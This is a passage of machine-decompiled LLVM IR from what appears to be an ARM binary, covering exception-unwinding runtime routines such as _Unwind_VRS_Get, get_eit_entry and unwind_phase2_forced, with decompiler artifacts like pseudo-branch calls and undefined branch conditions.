  %v3_1852c = add i32 %v4_18520, %v0_1851c
  %v4_1852c = inttoptr i32 %v3_1852c to i32*
  store i32 %v1_18524, i32* %v4_1852c, align 4
  %v0_1853c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_18534:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_18534 = icmp eq i32 %arg1, 0
  br i1 %v2_18534, label %dec_label_pc_18548, label %dec_label_pc_1853c

dec_label_pc_1853c:                               ; preds = %dec_label_pc_18534, %dec_label_pc_18518
  %v0_1853c = phi i32 [ %arg1, %dec_label_pc_18534 ], [ %v0_1853c.pre, %dec_label_pc_18518 ]
  %v3_18540 = ashr i32 %v0_1853c, 31
  br label %dec_label_pc_1854c

dec_label_pc_18548:                               ; preds = %dec_label_pc_18534
  br label %dec_label_pc_1854c

dec_label_pc_1854c:                               ; preds = %dec_label_pc_1853c, %dec_label_pc_18548
  %v1_18554 = phi i32 [ %v0_1853c, %dec_label_pc_1853c ], [ %tmp8, %dec_label_pc_18548 ]
  %storemerge = phi i32 [ %v3_18540, %dec_label_pc_1853c ], [ %tmp, %dec_label_pc_18548 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_18554

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 8, 6, 7, 0, 4, 1, 2, 3, 9, 10, 5 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_2229c.359, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 65, 71, 70, 64, 63, 80, 79, 68, 69, 67, 66, 78, 77, 76, 75, 74, 73, 72, 18, 26, 28, 34, 62, 43, 42, 12, 6, 5, 11, 25, 24, 10, 3, 2, 13, 9, 8, 7, 48, 15, 23, 47, 46, 27, 20, 22, 21, 59, 58, 31, 30, 29, 32, 33, 57, 45, 56, 55, 17, 16, 54, 19, 61, 60, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 14, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1854c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1855c = icmp eq i32 %regclass, 0
  br i1 %v2_1855c, label %dec_label_pc_18564, label %dec_label_pc_18594

dec_label_pc_18564:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18564
  %v6_18568 = icmp eq i32 %representation, 0
  br i1 %v6_18568, label %dec_label_pc_18578, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18564
  br label %dec_label_pc_185a0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_185a0

dec_label_pc_18578:                               ; preds = %bb
  %v3_18578 = mul i32 %regno, 4
  %v2_1857c = add i32 %v3_18578, %context
  %v1_18580 = add i32 %v2_1857c, 4
  %v2_18580 = inttoptr i32 %v1_18580 to i32*
  %v3_18580 = load i32, i32* %v2_18580, align 4
  %v2_1858c = bitcast i8* %valuep to i32*
  store i32 %v3_18580, i32* %v2_1858c, align 4
  ret i32 0

dec_label_pc_18594:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18594
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18594, %bb9
  %v0_1859c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1859c)
  br label %dec_label_pc_185a0

dec_label_pc_185a0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_185a0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_185a8 = icmp eq i32 %regclass, 0
  br i1 %v2_185a8, label %dec_label_pc_185b0, label %dec_label_pc_185e0

dec_label_pc_185b0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_185b0
  %v6_185b4 = icmp eq i32 %representation, 0
  br i1 %v6_185b4, label %dec_label_pc_185c4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_185b0
  br label %dec_label_pc_185ec

bb8:                                              ; preds = %bb
  br label %dec_label_pc_185ec

dec_label_pc_185c4:                               ; preds = %bb
  %v3_185c8 = mul i32 %regno, 4
  %v1_185cc = bitcast i8* %valuep to i32*
  %v2_185cc = load i32, i32* %v1_185cc, align 4
  %v2_185d0 = add i32 %v3_185c8, %context
  %v2_185d8 = add i32 %v2_185d0, 4
  %v3_185d8 = inttoptr i32 %v2_185d8 to i32*
  store i32 %v2_185cc, i32* %v3_185d8, align 4
  ret i32 0

dec_label_pc_185e0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_185e0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_185e0, %bb9
  %v0_185e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_185e8)
  br label %dec_label_pc_185ec

dec_label_pc_185ec:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_185ec, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_185f4 = add i32 %context, 68
  %v2_185f4 = inttoptr i32 %v1_185f4 to i32*
  %v3_185f4 = load i32, i32* %v2_185f4, align 4
  ret i32 %v3_185f4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_18604 = add i32 %exc, 8
  %v2_18604 = inttoptr i32 %v1_18604 to i32*
  %v3_18604 = load i32, i32* %v2_18604, align 4
  %v2_18608 = icmp eq i32 %v3_18604, 0
  br i1 %v2_18608, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1861c = xor i1 %v2_18608, true
  call void @__pseudo_cond_branch(i1 %v2_1861c, i32 %v3_18604)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18634 = call i32 @abort()
  ret i32 %v0_18634
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18640 = call i32 @abort()
  ret i32 %v0_18640
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18644 = load i32, i32* @r4, align 4
  store i32 %v3_18644, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r5.global-to-local, align 4
  %v4_18654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 132) to i32*), align 4
  %v2_18658 = icmp eq i32 %v4_18654, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18664 = add i32 %return_address, -2
  store i32 %v1_18664, i32* %r4.global-to-local, align 4
  br i1 %v2_18658, label %dec_label_pc_1869c, label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18654)
  %v2_1867c = icmp eq i32 %v1_18664, 0
  br i1 %v2_1867c, label %.thread, label %dec_label_pc_186bcthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1866c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_18684 = load i32, i32* %r6.global-to-local, align 4
  %v3_18684 = add i32 %v2_18684, 16
  %v4_18684 = inttoptr i32 %v3_18684 to i32*
  store i32 0, i32* %v4_18684, align 4
  br label %dec_label_pc_1868c

dec_label_pc_1868c:                               ; preds = %.thread, %.thread10, %dec_label_pc_18834, %dec_label_pc_18820, %dec_label_pc_187fc, %dec_label_pc_187d4, %dec_label_pc_186d4
  %v0_1868c = load i32, i32* %r2.global-to-local, align 4
  %v2_18694 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_18694, i32* @r4, align 4
  ret i32 %v0_1868c

dec_label_pc_1869c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_186a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 20) to i32*), align 4
  %v4_186a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 48) to i32*), align 4
  store i32 %v4_186a8, i32* %r2.global-to-local, align 4
  %v2_186ac = sub i32 %v4_186a4, %v4_186a8
  %v3_186b0 = sdiv i32 %v2_186ac, 8
  store i32 %v3_186b0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_186bc

dec_label_pc_186bcthread-pre-split:               ; preds = %dec_label_pc_1866c
  %v3_186bc.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_186bc

dec_label_pc_186bc:                               ; preds = %dec_label_pc_186bcthread-pre-split, %dec_label_pc_1869c
  %v0_18700.pre = phi i32 [ %v1_18664, %dec_label_pc_186bcthread-pre-split ], [ %v4_186a8, %dec_label_pc_1869c ]
  %v1_186c4 = phi i32 [ %v3_186bc.pr, %dec_label_pc_186bcthread-pre-split ], [ %v3_186b0, %dec_label_pc_1869c ]
  %v2_186c0 = icmp eq i32 %v1_186c4, 0
  br i1 %v2_186c0, label %dec_label_pc_186d4, label %dec_label_pc_186f0.preheader

dec_label_pc_186f0.preheader:                     ; preds = %dec_label_pc_186bc
  %v2_186c4 = add i32 %v1_186c4, -1
  %v1_18720 = add i32 %v0_18700.pre, 8
  br label %dec_label_pc_186f0.outer

dec_label_pc_186d4.loopexit:                      ; preds = %dec_label_pc_1874c
  br label %dec_label_pc_186d4

dec_label_pc_186d4:                               ; preds = %dec_label_pc_186d4.loopexit, %dec_label_pc_186bc, %dec_label_pc_18818
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_186dc = load i32, i32* %r6.global-to-local, align 4
  %v2_186dc = add i32 %v1_186dc, 16
  %v3_186dc = inttoptr i32 %v2_186dc to i32*
  store i32 0, i32* %v3_186dc, align 4
  br label %dec_label_pc_1868c

dec_label_pc_186e4:                               ; preds = %dec_label_pc_18740
  %v3_186e4 = icmp ult i32 %storemerge40, %v0_18744
  br i1 %v3_186e4, label %dec_label_pc_186ec, label %dec_label_pc_1875c

dec_label_pc_186ec:                               ; preds = %dec_label_pc_186e4
  %v1_186ec = add nsw i32 %v3_186f8, 1
  br label %dec_label_pc_186f0.outer

dec_label_pc_186f0.outer:                         ; preds = %dec_label_pc_186ec, %dec_label_pc_186f0.preheader
  %v1_1874c.ph = phi i32 [ %v1_186ec, %dec_label_pc_186ec ], [ 0, %dec_label_pc_186f0.preheader ]
  %v0_186f0.ph = phi i32 [ %v0_186f0, %dec_label_pc_186ec ], [ %v2_186c4, %dec_label_pc_186f0.preheader ]
  br label %dec_label_pc_186f0

dec_label_pc_186f0:                               ; preds = %dec_label_pc_186f0.outer, %dec_label_pc_18754
  %v0_186f0 = phi i32 [ %v1_18754, %dec_label_pc_18754 ], [ %v0_186f0.ph, %dec_label_pc_186f0.outer ]
  %v2_186f0 = add i32 %v0_186f0, %v1_1874c.ph
  %tmp = icmp slt i32 %v2_186f0, 0
  %v4_186f4 = zext i1 %tmp to i32
  %v5_186f4 = add i32 %v4_186f4, %v2_186f0
  %v3_186f8 = sdiv i32 %v5_186f4, 2
  %v3_186fc = mul i32 %v3_186f8, 8
  store i32 %v3_186fc, i32* @ip, align 4
  %v2_18700 = add i32 %v3_186fc, %v0_18700.pre
  %v3_18700 = inttoptr i32 %v2_18700 to i32*
  %v4_18700 = load i32, i32* %v3_18700, align 4
  %v1_18704 = and i32 %v4_18700, 1073741824
  %v2_18704 = icmp eq i32 %v1_18704, 0
  %v2_18708 = or i32 %v4_18700, -2147483648
  %tmp79 = bitcast i32 %v4_18700 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1870c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_18704, i32 %v2_1870c, i32 %v2_18708
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_18710 = icmp eq i32 %v2_186c4, %v3_186f8
  store i32 %v2_18700, i32* %r7.global-to-local, align 4
  br i1 %v9_18710, label %dec_label_pc_18740, label %dec_label_pc_18720

dec_label_pc_18720:                               ; preds = %dec_label_pc_186f0
  %v2_18724 = add i32 %v3_186fc, %v1_18720
  %v3_18724 = inttoptr i32 %v2_18724 to i32*
  %v4_18724 = load i32, i32* %v3_18724, align 4
  %v1_1872c = and i32 %v4_18724, 1073741824
  %v2_1872c = icmp eq i32 %v1_1872c, 0
  %v2_18730 = or i32 %v4_18724, -2147483648
  %tmp81 = bitcast i32 %v4_18724 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_18734 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1872c, i32 %v2_18734, i32 %v2_18730
  %v1_18738 = add i32 %v2_18724, -1
  %v2_1873c = add i32 %storemerge39, %v1_18738
  br label %dec_label_pc_18740

dec_label_pc_18740:                               ; preds = %dec_label_pc_186f0, %dec_label_pc_18720
  %storemerge40 = phi i32 [ %v2_1873c, %dec_label_pc_18720 ], [ -1, %dec_label_pc_186f0 ]
  %v2_18740 = add i32 %storemerge, %v2_18700
  %v0_18744 = load i32, i32* %r4.global-to-local, align 4
  %v3_18744 = icmp ult i32 %v0_18744, %v2_18740
  br i1 %v3_18744, label %dec_label_pc_1874c, label %dec_label_pc_186e4

dec_label_pc_1874c:                               ; preds = %dec_label_pc_18740
  %v9_1874c = icmp eq i32 %v3_186f8, %v1_1874c.ph
  br i1 %v9_1874c, label %dec_label_pc_186d4.loopexit, label %dec_label_pc_18754

dec_label_pc_18754:                               ; preds = %dec_label_pc_1874c
  %v1_18754 = add nsw i32 %v3_186f8, -1
  br label %dec_label_pc_186f0

dec_label_pc_1875c:                               ; preds = %dec_label_pc_186e4
  %v2_1875c = load i32, i32* %v3_18700, align 4
  %v1_18760 = and i32 %v2_1875c, 1073741824
  %v2_18760 = icmp eq i32 %v1_18760, 0
  %v2_18764 = or i32 %v2_1875c, -2147483648
  %tmp83 = bitcast i32 %v2_1875c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18768 = bitcast float %tmp84 to i32
  %v0_1876c = select i1 %v2_18760, i32 %v2_18768, i32 %v2_18764
  %v2_1876c = add i32 %v0_1876c, %v2_18700
  %v1_18770 = load i32, i32* %r6.global-to-local, align 4
  %v2_18770 = add i32 %v1_18770, 72
  %v3_18770 = inttoptr i32 %v2_18770 to i32*
  store i32 %v2_1876c, i32* %v3_18770, align 4
  %v0_18774 = load i32, i32* %r7.global-to-local, align 4
  %v1_18774 = add i32 %v0_18774, 4
  %v2_18774 = inttoptr i32 %v1_18774 to i32*
  %v3_18774 = load i32, i32* %v2_18774, align 4
  %v7_18778 = icmp eq i32 %v3_18774, 1
  br i1 %v7_18778, label %.thread10, label %dec_label_pc_1878c

.thread10:                                        ; preds = %dec_label_pc_1875c
  %v1_18778 = add i32 %v3_18774, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_18784 = load i32, i32* %r6.global-to-local, align 4
  %v3_18784 = add i32 %v2_18784, 16
  %v4_18784 = inttoptr i32 %v3_18784 to i32*
  store i32 %v1_18778, i32* %v4_18784, align 4
  br label %dec_label_pc_1868c

dec_label_pc_1878c:                               ; preds = %dec_label_pc_1875c
  %v1_1878c = icmp slt i32 %v3_18774, 0
  br i1 %v1_1878c, label %.thread38, label %dec_label_pc_187a4

.thread38:                                        ; preds = %dec_label_pc_1878c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_18798 = load i32, i32* %r6.global-to-local, align 4
  %v5_18798 = add i32 %v4_18798, 76
  %v6_18798 = inttoptr i32 %v5_18798 to i32*
  store i32 %v1_18774, i32* %v6_18798, align 4
  %v3_1879c = load i32, i32* %r2.global-to-local, align 4
  %v4_1879c = load i32, i32* %r6.global-to-local, align 4
  %v5_1879c = add i32 %v4_1879c, 80
  %v6_1879c = inttoptr i32 %v5_1879c to i32*
  store i32 %v3_1879c, i32* %v6_1879c, align 4
  br label %dec_label_pc_187c4

dec_label_pc_187a4:                               ; preds = %dec_label_pc_1878c
  %v1_187a4 = and i32 %v3_18774, 1073741824
  %v2_187a4 = icmp eq i32 %v1_187a4, 0
  %v2_187a8 = or i32 %v3_18774, -2147483648
  %tmp85 = bitcast i32 %v3_18774 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_187ac = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_187a4, i32 %v2_187ac, i32 %v2_187a8
  %v1_187b0 = add i32 %storemerge42, 4
  %v2_187b4 = add i32 %v1_187b0, %v0_18774
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_187bc = load i32, i32* %r6.global-to-local, align 4
  %v2_187bc = add i32 %v1_187bc, 76
  %v3_187bc = inttoptr i32 %v2_187bc to i32*
  store i32 %v2_187b4, i32* %v3_187bc, align 4
  %v0_187c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_187c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_187c0 = add i32 %v1_187c0, 80
  %v3_187c0 = inttoptr i32 %v2_187c0 to i32*
  store i32 %v0_187c0, i32* %v3_187c0, align 4
  br label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %.thread38, %dec_label_pc_187a4
  %v0_187c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_187c4 = add i32 %v0_187c4, 76
  %v2_187c4 = inttoptr i32 %v1_187c4 to i32*
  %v3_187c4 = load i32, i32* %v2_187c4, align 4
  store i32 %v3_187c4, i32* %r2.global-to-local, align 4
  %v1_187c8 = inttoptr i32 %v3_187c4 to i32*
  %v2_187c8 = load i32, i32* %v1_187c8, align 4
  %v1_187cc = icmp slt i32 %v2_187c8, 0
  br i1 %v1_187cc, label %dec_label_pc_187f0, label %dec_label_pc_187d4

dec_label_pc_187d4:                               ; preds = %dec_label_pc_187c4
  %v1_187d4 = and i32 %v2_187c8, 1073741824
  %v2_187d4 = icmp eq i32 %v1_187d4, 0
  %v2_187d8 = or i32 %v2_187c8, -2147483648
  %tmp87 = bitcast i32 %v2_187c8 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_187dc = bitcast float %tmp88 to i32
  %v0_187e0 = select i1 %v2_187d4, i32 %v2_187dc, i32 %v2_187d8
  %v2_187e0 = add i32 %v0_187e0, %v3_187c4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_187e8 = add i32 %v0_187c4, 16
  %v3_187e8 = inttoptr i32 %v2_187e8 to i32*
  store i32 %v2_187e0, i32* %v3_187e8, align 4
  br label %dec_label_pc_1868c

dec_label_pc_187f0:                               ; preds = %dec_label_pc_187c4
  %v3_187f0 = udiv i32 %v2_187c8, 16777216
  %v1_187f4 = urem i32 %v3_187f0, 16
  %v2_187f4 = icmp eq i32 %v1_187f4, 0
  br i1 %v2_187f4, label %dec_label_pc_187fc, label %dec_label_pc_18810

dec_label_pc_187fc:                               ; preds = %dec_label_pc_187f0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18804 = load i32, i32* %r5.global-to-local, align 4
  %v2_18804 = add i32 %v0_18804, -36916
  %v2_18808 = add i32 %v0_187c4, 16
  %v3_18808 = inttoptr i32 %v2_18808 to i32*
  store i32 %v2_18804, i32* %v3_18808, align 4
  br label %dec_label_pc_1868c

dec_label_pc_18810:                               ; preds = %dec_label_pc_187f0
  %v7_18810 = icmp eq i32 %v1_187f4, 1
  br i1 %v7_18810, label %dec_label_pc_18834, label %dec_label_pc_18818

dec_label_pc_18818:                               ; preds = %dec_label_pc_18810
  %v7_18818 = icmp eq i32 %v1_187f4, 2
  br i1 %v7_18818, label %dec_label_pc_18820, label %dec_label_pc_186d4

dec_label_pc_18820:                               ; preds = %dec_label_pc_18818
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18828 = load i32, i32* %r5.global-to-local, align 4
  %v2_18828 = add i32 %v0_18828, -36932
  %v2_1882c = add i32 %v0_187c4, 16
  %v3_1882c = inttoptr i32 %v2_1882c to i32*
  store i32 %v2_18828, i32* %v3_1882c, align 4
  br label %dec_label_pc_1868c

dec_label_pc_18834:                               ; preds = %dec_label_pc_18810
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1883c = load i32, i32* %r5.global-to-local, align 4
  %v2_1883c = add i32 %v0_1883c, -36924
  %v2_18840 = add i32 %v0_187c4, 16
  %v3_18840 = inttoptr i32 %v2_18840 to i32*
  store i32 %v2_1883c, i32* %v3_18840, align 4
  br label %dec_label_pc_1868c

; uselistorder directives
  uselistorder i32 %v1_187f4, { 2, 1, 0 }
  uselistorder i32 %v0_187c4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_18774, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18744, { 1, 0 }
  uselistorder i32 %v3_186fc, { 2, 1, 0 }
  uselistorder i32 %v3_186f8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_186f0, { 1, 0 }
  uselistorder i32 %v0_186f0, { 1, 0 }
  uselistorder i32 %v2_186c4, { 1, 0 }
  uselistorder i32 %v0_18700.pre, { 1, 0 }
  uselistorder i32 %v3_186b0, { 1, 0 }
  uselistorder i32 %v1_18664, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_187c4, { 1, 0 }
  uselistorder label %dec_label_pc_18740, { 1, 0 }
  uselistorder label %dec_label_pc_186f0, { 1, 0 }
  uselistorder label %dec_label_pc_186d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1868c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1884c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1884c:
  %v0_1884c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1884c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1884c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1884c, %bb
  %v10_18854 = phi i32 [ %arg1, %dec_label_pc_1884c ], [ 0, %bb ]
  ret i32 %v10_18854

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18868 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1887c = inttoptr i32 %v1_18868 to i32*
  %v2_1887c = load i32, i32* %v1_1887c, align 4
  store i32 %v2_1887c, i32* %r0.global-to-local, align 4
  %v12_1887c = add i32 %entry_vrs, 20
  %v1_18888 = inttoptr i32 %v12_1887c to i32*
  %v2_18888 = load i32, i32* %v1_18888, align 4
  store i32 %v2_18888, i32* %r0.global-to-local, align 4
  %v12_18888 = add i32 %entry_vrs, 36
  %v1_18890 = inttoptr i32 %v12_18888 to i32*
  %v2_18890 = load i32, i32* %v1_18890, align 4
  store i32 %v2_18890, i32* %r0.global-to-local, align 4
  %v12_18890 = add i32 %entry_vrs, 52
  store i32 %v12_18890, i32* @ip, align 4
  %v13_18894 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_18894, i32* @lr, align 4
  %v1_18898 = inttoptr i32 %v12_18890 to i32*
  %v2_18898 = load i32, i32* %v1_18898, align 4
  store i32 %v2_18898, i32* %r0.global-to-local, align 4
  %v9_18898 = add i32 %entry_vrs, 64
  %v10_18898 = inttoptr i32 %v9_18898 to i32*
  %v11_18898 = load i32, i32* %v10_18898, align 4
  store i32 0, i32* @r4, align 4
  %v1_188a0 = add i32 %ucbp, 12
  %v2_188a0 = inttoptr i32 %v1_188a0 to i32*
  %v3_188a0 = load i32, i32* %v2_188a0, align 4
  store i32 %v2_18898, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_188b8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18898)
  store i32 %v2_188b8, i32* %r0.global-to-local, align 4
  %v0_188bc = load i32, i32* @r6, align 4
  %v1_188bc = load i32, i32* @r4, align 4
  %v9_188bc = icmp eq i32 %v0_188bc, %v1_188bc
  store i32 %v2_188b8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_188bc, label %dec_label_pc_188d0, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_188dc

dec_label_pc_188d0:                               ; preds = %entry
  store i32 %v0_188bc, i32* @r4, align 4
  br label %dec_label_pc_188d8

dec_label_pc_188d8:                               ; preds = %dec_label_pc_189a0, %dec_label_pc_188d0
  br label %dec_label_pc_188dc

dec_label_pc_188dc:                               ; preds = %.thread, %dec_label_pc_188d8
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_188d8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_188dc = icmp eq i32 %v2_188b8, 0
  br i1 %v2_188dc, label %dec_label_pc_18954, label %.thread2.dec_label_pc_188f0_crit_edge

.thread2.dec_label_pc_188f0_crit_edge:            ; preds = %dec_label_pc_188dc
  br label %dec_label_pc_188f0

dec_label_pc_188f0:                               ; preds = %.thread2.dec_label_pc_188f0_crit_edge, %dec_label_pc_18954
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_18900 = load i32, i32* @r5, align 4
  store i32 %v0_18900, i32* @r3, align 4
  store i32 100624, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_188a0)
  br i1 false, label %dec_label_pc_18918, label %dec_label_pc_18940

dec_label_pc_18918:                               ; preds = %dec_label_pc_188f0
  br i1 undef, label %dec_label_pc_18920, label %dec_label_pc_18944

dec_label_pc_18920:                               ; preds = %dec_label_pc_18918
  br i1 undef, label %dec_label_pc_189a0, label %dec_label_pc_18938

dec_label_pc_18938:                               ; preds = %dec_label_pc_18920
  br i1 undef, label %dec_label_pc_18998, label %dec_label_pc_18940

dec_label_pc_18940:                               ; preds = %dec_label_pc_188f0, %dec_label_pc_18938
  br label %dec_label_pc_18944

dec_label_pc_18944:                               ; preds = %dec_label_pc_18918, %dec_label_pc_18940
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18954:                               ; preds = %dec_label_pc_188dc
  store i32 %v11_18898, i32* @r3, align 4
  %v2_18958 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18958, i32* @r4, align 4
  %v1_1895c = load i32, i32* @r5, align 4
  %v2_1895c = add i32 %v1_1895c, 20
  %v3_1895c = inttoptr i32 %v2_1895c to i32*
  store i32 %v11_18898, i32* %v3_1895c, align 4
  store i32 %v2_18958, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1896c = call i32 @memcpy()
  %v0_18974 = load i32, i32* @r6, align 4
  store i32 %v0_18974, i32* %r0.global-to-local, align 4
  %v0_18978 = load i32, i32* @r5, align 4
  %v1_1897c = add i32 %v0_18978, 16
  %v2_1897c = inttoptr i32 %v1_1897c to i32*
  %v3_1897c = load i32, i32* %v2_1897c, align 4
  store i32 %v3_1897c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1897c)
  %v0_1898c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1898c, i32* @r4, align 4
  br label %dec_label_pc_188f0

dec_label_pc_18998:                               ; preds = %dec_label_pc_18938
  br label %dec_label_pc_189a0

dec_label_pc_189a0:                               ; preds = %dec_label_pc_18920, %dec_label_pc_18998
